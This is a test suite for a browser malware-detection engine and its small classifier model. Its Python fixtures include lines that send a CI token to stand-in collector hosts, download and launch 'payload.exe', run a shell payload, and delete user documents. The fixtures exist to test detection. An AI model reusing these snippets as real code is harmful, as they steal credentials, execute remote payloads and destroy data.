import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";

import {
  analyzeSource,
  DEMO_SOURCES,
  getFullModelStatus,
  installFullModel,
  MAX_SOURCE_BYTES,
  predictMicro,
  predictMicroDetails,
} from "../engine.mjs";

const initialStatus = getFullModelStatus();
const unloadedReport = analyzeSource(
  DEMO_SOURCES.suspicious,
  "before-load.py",
);
let unloadedPredictionError = null;
try {
  predictMicro(["P:runtime|C:source|O:FILE_READ|T:readme.md"]);
} catch (error) {
  unloadedPredictionError = error;
}

const { FULL_MODEL_MANIFEST } = await import("../model.mjs");
const modelBytes = readFileSync(new URL("../model.bin", import.meta.url));
const modelBuffer = modelBytes.buffer.slice(
  modelBytes.byteOffset,
  modelBytes.byteOffset + modelBytes.byteLength,
);
installFullModel(FULL_MODEL_MANIFEST, modelBuffer);

test("engine import does not eagerly load model weights", () => {
  assert.equal(initialStatus.loaded, false);
  assert.equal(initialStatus.binaryBytes, 0);
  assert.equal(unloadedReport.model.loaded, false);
  assert.equal(unloadedReport.model.consulted, false);
  assert.equal(unloadedReport.model.used, false);
  assert.equal(unloadedReport.model.metadata, null);
  assert.match(unloadedPredictionError.message, /Download the full µMal model/);
});

test("web entry point imports the model manifest only on user action", () => {
  const appSource = readFileSync(
    new URL("../app.mjs", import.meta.url),
    "utf8",
  );
  const markup = readFileSync(
    new URL("../index.html", import.meta.url),
    "utf8",
  );
  assert.doesNotMatch(appSource, /^import .*model\.mjs/m);
  assert.match(appSource, /await import\("\.\/model\.mjs"\)/);
  assert.match(markup, /id="load-model"/);
  assert.doesNotMatch(markup, /class="hero"|id="method"|id="research"/);
});

test("full browser artifact matches the checkpoint architecture", () => {
  assert.equal(FULL_MODEL_MANIFEST.metadata.name, "µMal Full");
  assert.equal(FULL_MODEL_MANIFEST.metadata.parameters, 567_746);
  assert.equal(
    FULL_MODEL_MANIFEST.metadata.feature_schema,
    "malir.effect-context.2026-08-15-r3",
  );
  assert.equal(FULL_MODEL_MANIFEST.metadata.training_examples, 90);
  assert.equal(FULL_MODEL_MANIFEST.metadata.training_groups, 30);
  assert.equal(FULL_MODEL_MANIFEST.metadata.validation_examples, 54);
  assert.equal(FULL_MODEL_MANIFEST.metadata.validation_groups, 18);
  assert.equal(FULL_MODEL_MANIFEST.metadata.seed, 13);
  assert.ok(FULL_MODEL_MANIFEST.metadata.validation_metrics.nll < 0.05);
  assert.equal(
    FULL_MODEL_MANIFEST.metadata.validation_metrics.pair_ordering_accuracy,
    1,
  );
  assert.ok(
    FULL_MODEL_MANIFEST.metadata.validation_metrics.pair_probability_gap_min >
      0.7,
  );
  assert.ok(
    FULL_MODEL_MANIFEST.metadata.validation_metrics.semantic_variant_drift_max <
      0.1,
  );
  assert.equal(
    FULL_MODEL_MANIFEST.metadata.structured_objective.pair_constraints,
    30,
  );
  assert.equal(
    FULL_MODEL_MANIFEST.metadata.structured_objective.consistency_groups,
    30,
  );
  assert.equal(
    FULL_MODEL_MANIFEST.metadata.calibration,
    "temperature-scaled-validation",
  );
  assert.ok(FULL_MODEL_MANIFEST.metadata.temperature >= 1);
  assert.equal(
    FULL_MODEL_MANIFEST.metadata.validation_kind,
    "synthetic-group-disjoint-paired-effects-2026-08-15-r3",
  );
  assert.equal(
    FULL_MODEL_MANIFEST.metadata.training_protocol,
    "mumal-training.2026-08-15-r3",
  );
  assert.equal(
    FULL_MODEL_MANIFEST.support_profile.schema,
    "malir.support-profile.v1",
  );
  assert.equal(FULL_MODEL_MANIFEST.support_profile.prototypes.length, 30);
  assert.equal(FULL_MODEL_MANIFEST.support_profile.min_token_coverage, 1);
  assert.equal(FULL_MODEL_MANIFEST.support_profile.min_nearest_jaccard, 0.2);
  assert.equal(FULL_MODEL_MANIFEST.metadata.support_prototypes, 30);
  assert.equal(FULL_MODEL_MANIFEST.config.n_layers, 2);
  assert.equal(FULL_MODEL_MANIFEST.config.n_heads, 4);
  assert.equal(FULL_MODEL_MANIFEST.config.d_model, 96);
  assert.equal(FULL_MODEL_MANIFEST.binary.bytes, modelBytes.byteLength);
  assert.equal(getFullModelStatus().binaryBytes, modelBytes.byteLength);
});

test("browser rejects a malformed training-support profile", () => {
  const invalid = {
    ...FULL_MODEL_MANIFEST,
    support_profile: {
      ...FULL_MODEL_MANIFEST.support_profile,
      known_tokens: [],
    },
  };

  assert.throws(
    () => installFullModel(invalid, modelBuffer),
    /support profile/i,
  );
});


test("browser inference matches PyTorch smoke vectors", () => {
  for (const vector of FULL_MODEL_MANIFEST.smoke_vectors) {
    const actual = predictMicro(vector.tokens);
    assert.ok(
      Math.abs(actual - vector.probability) < 1e-6,
      "expected " + vector.probability + ", received " + actual,
    );
    assert.equal(actual, predictMicro(vector.tokens));
  }
});

test("windowed browser inference evaluates tokens beyond one context", () => {
  const tokens = Array.from({ length: 300 }, (_, index) => `TOKEN:${index}`);
  const result = predictMicroDetails(tokens);

  assert.equal(result.windows, 2);
  assert.equal(result.tokensEvaluated, tokens.length);
  assert.equal(result.truncated, false);
  assert.ok(result.probability >= 0 && result.probability <= 1);
  assert.equal(result.supported, false);
  assert.equal(result.abstained, true);
});


test("unknown MalIR tokens force support abstention", () => {
  const result = predictMicroDetails([
    "FILE",
    "P:runtime|C:source|O:CAMERA_READ|T:generic",
    "EFFECT:ENTRY:library_callable",
    "EFFECT:ORIGIN:camera",
  ]);

  assert.equal(result.supported, false);
  assert.equal(result.abstained, true);
  assert.ok(result.tokenCoverage < 1);
  assert.ok(
    result.unknownTokens.includes(
      "P:runtime|C:source|O:CAMERA_READ|T:generic",
    ),
  );
});


test("declared legacy OOD probes all abstain", () => {
  const rows = readFileSync(
    new URL("../../examples/micro_ood_v3.jsonl", import.meta.url),
    "utf8",
  )
    .trim()
    .split("\n")
    .map((line) => JSON.parse(line));
  const results = rows.map((row) => predictMicroDetails(row.tokens));

  assert.ok(results.every((result) => result.abstained));
  assert.ok(results.every((result) => !result.supported));
  assert.ok(
    results.every(
      (result) => result.probability >= 0 && result.probability <= 1,
    ),
  );
});


test("benign demo remains low signal", () => {
  const report = analyzeSource(DEMO_SOURCES.benign, "benign.py");
  assert.equal(report.assessment, "no-malware-evidence");
  assert.equal(report.verdict, "low-signal");
  assert.equal(report.model.loaded, true);
  assert.equal(report.model.consulted, true);
  assert.equal(report.model.used, false);
  assert.equal(report.model.gate, "below");
  assert.equal(report.model.supported, true);
  assert.equal(report.model.abstained, false);
  assert.equal(typeof report.model.probability, "number");
  assert.equal(report.riskScore, report.ruleScore);
});

test("browser exfiltration proximity remains reviewable and uses full µMal", () => {
  const report = analyzeSource(DEMO_SOURCES.suspicious, "exfil.py");
  assert.equal(report.assessment, "needs-review");
  assert.equal(report.verdict, "review");
  assert.equal(report.ruleScore, 28);
  assert.equal(report.riskScore, report.ruleScore);
  assert.equal(report.model.loaded, true);
  assert.equal(report.model.used, true);
  assert.equal(report.model.supported, true);
  assert.ok(report.model.probability < 0.2);
  assert.ok(
    report.modelTokens.some((token) =>
      token.includes("|O:NETWORK_SEND|"),
    ),
  );
  const path = report.evidence.find(
    (item) => item.motif === "credential_or_file_exfil",
  );
  assert.equal(path.evidenceKind, "proximity");
  assert.equal(path.confidence, "low");
  assert.equal(path.score, 2);
  assert.ok(report.evidence.every((item) => item.line > 0));
});

test("repeated URL sinks cannot inflate score or flood µMal input", () => {
  const prefix = `import base64
import os
import requests as http

def collect():
    token = os.getenv("CI_TOKEN")
    packed = base64.b64encode(token.encode())
`;
  const calls = Array.from(
    { length: 20 },
    (_, index) =>
      `    http.post("https://collector${index || ""}.invalid/collect", data=packed)`,
  );
  calls[0] =
    `    http.post("https://example.invalid/collect", data=packed)`;
  const spammed = analyzeSource(prefix + calls.join("\n") + "\n", "exfil.py");
  const single = analyzeSource(DEMO_SOURCES.suspicious, "exfil.py");

  assert.equal(spammed.ruleScore, 28);
  assert.equal(spammed.ruleScore, single.ruleScore);
  assert.equal(spammed.riskScore, single.riskScore);
  assert.deepEqual(spammed.modelTokens, single.modelTokens);
  assert.equal(spammed.model.consulted, true);
  assert.equal(spammed.model.used, true);
  assert.ok(spammed.model.suppressedTokens > 0);
  assert.ok(spammed.suppressedEvidenceCount > 0);
  assert.equal(
    spammed.evidence.find((item) => item.op === "NETWORK_SEND").occurrences,
    20,
  );
});


test("effect context keeps a dual-use code transformer in review", () => {
  const source = `import ast
import sys
exec("Alias = ast.AST")

class Rewrite(ast.NodeTransformer):
    pass

def transform(input_path, output_path):
    with open(input_path, "r") as source_file:
        tree = ast.parse(source_file.read())
    compile(tree, "<generated>", "exec")
    with open(output_path, "w") as output_file:
        output_file.write(ast.unparse(tree))

if __name__ == "__main__":
    transform(sys.argv[1], sys.argv[2])
`;
  const report = analyzeSource(source, "transformer.py");

  assert.equal(report.effectSummary.primaryPurpose, "local-code-transformer");
  assert.equal(report.effectSummary.purposeCandidates[0].confidence, "medium");
  assert.equal(report.capabilityScore, 30);
  assert.equal(report.riskScore, report.capabilityScore);
  assert.equal(report.verdict, "review");
  assert.equal(report.model.used, true);
  assert.ok(report.model.probability < 0.2);
  assert.ok(report.modelTokens.includes("PURPOSE:local_code_transformer|Q:medium"));
});

test("network effects block the local-transformer purpose shortcut", () => {
  const source = `import ast
import requests
import sys

def transform(input_path, output_path):
    with open(input_path, "r") as source_file:
        text = source_file.read()
    tree = ast.parse(text)
    compile(tree, "<generated>", "exec")
    with open(output_path, "w") as output_file:
        output_file.write(ast.unparse(tree))
    requests.post("https://example.invalid/upload", data=text)

if __name__ == "__main__":
    transform(sys.argv[1], sys.argv[2])
`;
  const report = analyzeSource(source, "transformer.py");

  assert.notEqual(
    report.effectSummary.primaryPurpose,
    "local-code-transformer",
  );
});

test("literal imports and untyped writes do not become risky effects", () => {
  const report = analyzeSource(
    `first = __import__("ast")
second = __import__("ast")
name = "json"
third = __import__(name)

def render(handle):
    handle.write("text")
`,
    "plugin.py",
  );

  assert.equal(
    report.events.filter((event) => event.op === "IMPORT").length,
    1,
  );
  assert.equal(
    report.events.filter((event) => event.op === "DYNAMIC_IMPORT").length,
    1,
  );
  assert.equal(
    report.events.some((event) => event.op === "FILE_WRITE"),
    false,
  );
});

test("target normalization does not mistake tokenizer names for secrets", () => {
  const report = analyzeSource(
    `import tokenizer
from pathlib import Path
text = Path("tokenizer.py").read_text()
`,
    "tokenizer_runner.py",
  );

  assert.equal(
    report.modelTokens.some((token) => token.endsWith("|T:sensitive")),
    false,
  );
  assert.ok(report.modelTokens.some((token) => token.endsWith("|T:file")));
});

test("proximity does not become a causal effect flow", () => {
  const report = analyzeSource(
    `def collect():
    secret = os.getenv("CI_TOKEN")
    harmless = "hello"
    requests.post("https://example.invalid/t", data=harmless)
`,
    "telemetry.py",
  );
  assert.ok(
    report.modelTokens.includes(
      "PATH:credential_or_file_exfil|K:proximity|Q:low",
    ),
  );
  assert.equal(
    report.modelTokens.includes("EFFECT:FLOW:sensitive_data_to_network"),
    false,
  );
  assert.ok(
    report.modelTokens.includes("PURPOSE:sensitive_data_transfer|Q:low"),
  );
});

test("delete context distinguishes cleanup from destructive targets", () => {
  const cleanup = analyzeSource(
    `def cleanup():
    os.remove("cache.tmp")
`,
    "cleanup.py",
  );
  const destructive = analyzeSource(
    `def wipe():
    os.remove("user_documents")
`,
    "wipe.py",
  );
  assert.equal(cleanup.ruleScore, 10);
  assert.equal(cleanup.motifs.some((item) => item.motif === "destructive_file_action"), false);
  assert.ok(cleanup.modelTokens.some((token) => token.endsWith("|T:delete_temporary")));
  assert.ok(destructive.modelTokens.some((token) => token.endsWith("|T:delete_user_data")));
  assert.ok(destructive.motifs.some((item) => item.motif === "destructive_file_action"));
});

test("install process targets preserve coarse command roles", () => {
  const compiler = analyzeSource(`os.system("gcc --version")\n`, "setup.py");
  const shell = analyzeSource(`os.system("sh payload.sh")\n`, "setup.py");
  const interpreter = analyzeSource(
    `subprocess.run(["python", "build.py"])\n`,
    "setup.py",
  );
  assert.ok(compiler.modelTokens.some((token) => token.endsWith("|T:process_compiler")));
  assert.ok(shell.modelTokens.some((token) => token.endsWith("|T:process_shell")));
  assert.ok(interpreter.modelTokens.some((token) => token.endsWith("|T:process_interpreter")));
});

test("download and dynamic execution create reviewable paths", () => {
  const report = analyzeSource(DEMO_SOURCES.download, "stage.py");
  assert.equal(report.verdict, "suspicious");
  assert.ok(report.motifs.some((item) => item.motif === "download_execute"));
  assert.ok(report.motifs.some((item) => item.motif === "encoded_execution"));
});

test("comments and quoted code are not treated as calls", () => {
  const report = analyzeSource(
    `# os.system("never")
message = "requests.post('https://example.invalid')"
print(message)
`,
    "quoted.py",
  );
  assert.equal(report.ruleScore, 0);
  assert.equal(
    report.events.some((event) => event.op === "PROCESS_EXEC"),
    false,
  );
  assert.equal(
    report.events.some((event) => event.op === "NETWORK_SEND"),
    false,
  );
});

test("browser input is bounded", () => {
  assert.throws(
    () => analyzeSource("x".repeat(MAX_SOURCE_BYTES + 1), "large.py"),
    /1 MB/,
  );
});

test("unittest setUp is not treated as package installation", () => {
  const report = analyzeSource(
    `class Case:
    def setUp(self):
        exec("value = 1")
`,
    "tests/test_case.py",
  );
  const dynamic = report.events.find((event) => event.op === "DYNAMIC_EXEC");
  assert.equal(dynamic.phase, "runtime");
  assert.equal(
    report.motifs.some((item) => item.motif === "install_time_execution"),
    false,
  );
});

test("write payload text is not interpreted as a persistence path", () => {
  const report = analyzeSource(
    `def render(handle):
    handle.write(".. toctree::\\n   :maxdepth: 1\\n")
`,
    "docs.py",
  );
  assert.equal(
    report.events.some((event) => event.op === "PERSISTENCE_WRITE"),
    false,
  );
});


test("effect context separates backup transfer from download execution", () => {
  const backup = predictMicro([
    "FILE",
    "P:runtime|C:source|O:FILE_READ|T:file",
    "P:runtime|C:transform|O:ENCODE|T:generic",
    "P:runtime|C:sink|O:NETWORK_SEND|T:network",
    "EFFECT:ENTRY:library_callable",
    "EFFECT:ORIGIN:local_file",
    "EFFECT:DESTINATION:network",
    "EFFECT:TRANSFORM:encoding",
  ]);
  const remoteExecution = predictMicro([
    "FILE",
    "P:runtime|C:source|O:NETWORK_RECEIVE|T:network",
    "P:runtime|C:sink|O:PROCESS_EXEC|T:process_generic",
    "PATH:download_execute|K:dataflow|Q:high",
    "EFFECT:ENTRY:library_callable",
    "EFFECT:ORIGIN:network",
    "EFFECT:DESTINATION:process",
    "EFFECT:FLOW:network_to_execution",
    "PURPOSE:remote_code_executor|Q:high",
  ]);

  assert.ok(backup < 0.1);
  assert.ok(remoteExecution > 0.9);
  assert.ok(remoteExecution - backup > 0.8);
});


test("generic environment values do not become credential proximity", () => {
  const generic = analyzeSource(
    `def send():
    value = os.getenv("API_URL")
    requests.post("https://example.invalid/t", data=value)
`,
    "generic-env.py",
  );
  assert.equal(
    generic.motifs.some((item) => item.motif === "credential_or_file_exfil"),
    false,
  );
});

test("legacy urlopen and startfile retain coarse browser capabilities", () => {
  const report = analyzeSource(
    `def run():
    remote = urllib.urlopen("https://example.invalid/payload.exe")
    os.startfile("download.exe")
`,
    "legacy.py",
  );
  assert.ok(report.events.some((event) => event.op === "NETWORK_RECEIVE"));
  assert.ok(report.events.some((event) => event.op === "PROCESS_EXEC"));
});
